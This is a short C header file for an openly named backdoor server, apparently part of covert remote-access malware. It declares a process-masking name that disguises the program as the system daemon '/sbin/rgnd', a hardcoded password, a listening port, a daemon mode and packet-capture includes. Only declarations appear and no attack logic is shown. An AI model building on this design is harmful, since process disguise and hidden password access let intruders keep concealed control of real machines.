#ifndef BACKDOOR_SERVER_H
#define BACKDOOR_SERVER_H

#include "utils.h"
#include "pktcap.h"

#define MASK_NAME "/sbin/rgnd -f"
#define DEFAULT_PORT 8080
#define TRUE 1
#define FALSE 0
#define PASSWORD "uest1onQ?"

struct options
{
	int daemon_mode;
	int port;
} user_options;

int start_server();
int daemon_parse_option(int argc, char **argv);
int print_server_info();
void mask_process(char **argv);

#endif
